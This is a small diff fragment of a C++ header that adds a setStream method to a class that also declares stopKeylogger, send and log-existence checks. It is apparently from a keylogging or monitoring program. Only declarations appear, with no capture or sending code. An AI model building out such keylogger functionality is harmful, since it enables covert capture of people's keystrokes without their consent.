@@ -27,7 +27,7 @@ public:
     void stopKeylogger();
     void send() override;
     void sendState() const;
-
+    void setStream(const Stream &);
 private:
     [[nodiscard]] bool lastLogExists() const;
     [[nodiscard]] bool logsExists() const;
